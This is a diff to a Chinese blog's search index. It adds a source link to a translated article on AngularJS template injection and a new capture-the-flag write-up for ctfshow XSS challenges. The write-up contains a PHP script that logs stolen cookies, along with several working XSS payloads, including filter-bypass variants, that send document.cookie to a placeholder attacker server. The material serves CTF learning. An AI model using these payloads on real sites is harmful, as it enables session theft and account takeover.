@@ -573,7 +573,8 @@
   <entry>
     <title>没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入</title>
     <url>/2022/05/12/AngularJS%20xss/</url>
-    <content><![CDATA[<p>研究员加雷斯·海耶斯</p>
+    <content><![CDATA[<p>文章引用自：<a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p>
+<p>研究员加雷斯·海耶斯</p>
 <p><a href="https://twitter.com/garethheyes">@garethheyes</a>(蓝鸟)</p>
 <h3 id="抽象的"><a href="#抽象的" class="headerlink" title="抽象的"></a>抽象的</h3><p>对极受欢迎的 JavaScript 框架<a href="https://angularjs.org/">AngularJS</a>的天真使用将许多网站暴露给 Angular 模板注入。这种相对低调的<a href="https://portswigger.net/blog/server-side-template-injection">服务器端模板注入</a>兄弟可以与 Angular 沙箱逃逸相结合，以在其他安全站点上发起<a href="https://portswigger.net/web-security/cross-site-scripting">跨站点脚本</a>( <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> ) 攻击。到目前为止，还没有公开的沙盒逃逸会影响 Angular 1.3.1+ 和 1.4.0+。这篇文章将总结 Angular 模板注入的核心概念，然后展示影响所有现代 Angular 版本的新沙箱逃逸的开发。</p>
 <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>AngularJS 是 Google 编写的 MVC 客户端框架。使用 Angular，您通过 view-source 或 Burp 看到的包含“ng-app”的 HTML 页面实际上是模板，并将由 Angular 呈现。这意味着如果用户输入直接嵌入到页面中，应用程序可能容易受到客户端模板注入的攻击。即使用户输入是 HTML 编码的并且在属性内也是如此。</p>
@@ -720,6 +721,36 @@
       <tags>
         <tag>Web</tag>
         <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow_xss_wp</title>
+    <url>/2022/05/14/ctfshow_xss_wp/</url>
+    <content><![CDATA[<p>跨站脚本攻击在这一套题目中体现的淋漓尽致。</p>
+<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，</p>
+<p>都差不多，比如<a href="http://xsscom.com/%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%98%E6%AF%94%E8%BE%83%E5%BF%AB%E3%80%82">http://xsscom.com/加载的还比较快。</a></p>
+<p>我用的自己服务器，贴上一个这个脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。</p>
+<p>payload：</p>
+<p><code>&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p><code>window.location.href</code>可以理解成是，跳转到href里，具体参考<a href="https://www.cnblogs.com/Qian123/p/5345298.html#_label3">https://www.cnblogs.com/Qian123/p/5345298.html#_label3</a></p>
+<p><code>document.cookie</code>就是创建一个cookie,这里是把目标cookie窃取下来，具体参考<a href="https://www.runoob.com/jsref/prop-doc-cookie.html">https://www.runoob.com/jsref/prop-doc-cookie.html</a></p>
+<h3 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h3><p>这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss</p>
+<p>但是payload:</p>
+<p><code>&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>无敌</p>
+<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>过滤了空格，但是tab或者/或者/**/都可以用</p>
+<p>所以payload:</p>
+<p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>Web</tag>
+        <tag>XSS</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
 </search>
